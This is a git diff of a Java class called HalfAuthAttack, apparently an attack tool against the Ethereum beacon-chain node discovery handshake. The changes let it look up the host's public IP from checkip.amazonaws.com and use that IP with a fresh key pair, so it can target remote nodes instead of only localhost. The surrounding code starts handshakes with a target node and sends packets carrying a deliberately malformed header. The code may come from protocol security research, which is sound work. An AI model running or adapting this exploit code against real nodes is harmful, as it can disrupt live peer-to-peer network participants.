@@ -17,7 +17,12 @@ import org.web3j.rlp.RlpList;
 import org.web3j.rlp.RlpString;
 import org.web3j.rlp.RlpType;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.net.BindException;
+import java.net.URL;
+import java.nio.charset.Charset;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.CompletableFuture;
@@ -26,7 +31,9 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 import java.util.function.Function;
 
+import static org.apache.commons.codec.CharEncoding.UTF_8;
 import static org.ethereum.beacon.discovery.util.Functions.PRIVKEY_SIZE;
+import static org.ethereum.beacon.discovery.util.Functions.generateECKeyPair;
 
 public class HalfAuthAttack {
     public static final String LOCALHOST = "127.0.0.1";
@@ -42,9 +49,13 @@ public class HalfAuthAttack {
         if (enr.startsWith("enr:")) {
             enr = enr.substring(4);
         }
+        URL url = new URL("http://checkip.amazonaws.com/");
+        BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream(), StandardCharsets.UTF_8));
+        String ip = br.readLine();
+
         CompletableFuture<Void> passed = new CompletableFuture<>();
         final NodeRecord server = new NodeRecordFactory(new IdentitySchemaV4Interpreter()).fromBase64(enr);
-        final DiscoverySystem client = createDiscoveryClient(server);
+        final DiscoverySystem client = createDiscoveryClient(true, ip, generateECKeyPair(), server);
         Long start = System.nanoTime();
 //        CompletableFuture<Void> neverCompleted = new CompletableFuture<>();
         client.startHandshake(server).thenApply(packet -> {
@@ -95,16 +106,6 @@ public class HalfAuthAttack {
                 Bytes.wrap(RlpEncoder.encode(new RlpList(badHeader))),
                 packet.getEncryptedMessage()
         );
-    }
-
-    private static DiscoverySystem createDiscoveryClient(final NodeRecord... bootnodes) throws Exception {
-        return createDiscoveryClient(true, bootnodes);
-    }
-
-    private static DiscoverySystem createDiscoveryClient(
-            final boolean signNodeRecord, final NodeRecord... bootnodes) throws Exception {
-        return createDiscoveryClient(
-                signNodeRecord, LOCALHOST, Functions.generateECKeyPair(), bootnodes);
     }
 
     private static DiscoverySystem createDiscoveryClient(
